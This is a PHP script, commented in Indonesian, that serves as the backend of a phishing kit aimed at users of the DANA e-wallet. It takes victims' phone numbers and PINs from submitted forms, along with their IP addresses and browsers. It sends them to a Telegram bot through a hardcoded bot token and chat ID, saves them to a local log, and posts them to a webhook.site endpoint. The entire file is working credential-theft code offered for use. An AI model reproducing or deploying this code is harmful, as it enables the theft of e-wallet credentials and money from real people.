<?php
// ==========================================================
// SIMPAN.PHP - PENANGKAP DATA KORBAN DANA
// GANTI TOKEN BOT & CHAT ID DI BAWAH
// ==========================================================

$BOT_TOKEN = '8807488216:AAHXoGVJDIwn8M9OAEKwGnZmzJzxefeUr0M';
$CHAT_ID   = '8938118595';
// ======================================

header('Content-Type: text/plain');
header('Access-Control-Allow-Origin: *');

// Ambil data
$nomor = $_POST['nomor'] ?? '-';
$pin   = $_POST['pin']   ?? '-';
$tahap = $_POST['tahap'] ?? '-';
$ip    = $_SERVER['REMOTE_ADDR'] ?? '-';
$ua    = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$time  = date('Y-m-d H:i:s');

// Format laporan
$pesan  = "🔥 *DATA KORBAN DANA BARU* 🔥\n";
$pesan .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$pesan .= "🕒 *Waktu:* $time\n";
$pesan .= "🌐 *IP:* `$ip`\n";
$pesan .= "📌 *Tahap:* $tahap\n";
$pesan .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$pesan .= "📱 *Nomor DANA:* `+62$nomor`\n";
$pesan .= "🔐 *PIN DANA:* `$pin`\n";
$pesan .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$pesan .= "📲 *User Agent:*\n`$ua`\n";
$pesan .= "━━━━━━━━━━━━━━━━━━━━━━\n";

// Kirim ke Telegram
function sendTelegram($token,$chat_id,$msg){
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id'=>$chat_id,'text'=>$msg,'parse_mode'=>'Markdown'];
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}

if($BOT_TOKEN!=='8807488216:AAHXoGVJDIwn8M9OAEKwGnZmzJzxefeUr0M'){
    sendTelegram($BOT_TOKEN,$CHAT_ID,$pesan);
}

// Backup ke log.txt
$log  = "============================================================\n";
$log .= "TAHAP     : $tahap\n";
$log .= "WAKTU     : $time\n";
$log .= "IP        : $ip\n";
$log .= "NOMOR     : +62$nomor\n";
$log .= "PIN       : $pin\n";
$log .= "USERAGENT : $ua\n";
$log .= "============================================================\n\n";
file_put_contents('log.txt',$log,FILE_APPEND|LOCK_EX);

// Backup ke webhook (opsional)
$webhook = 'https://webhook.site/GANTI-DENGAN-URL-WEBHOOK';
$payload = json_encode(['nomor'=>$nomor,'pin'=>$pin,'tahap'=>$tahap,'ip'=>$ip,'ua'=>$ua,'time'=>$time]);
@file_get_contents($webhook,false,stream_context_create([
    'http'=>['method'=>'POST','header'=>"Content-Type: application/json\r\n",'content'=>$payload]
]));

echo 'OK';
exit;
?>
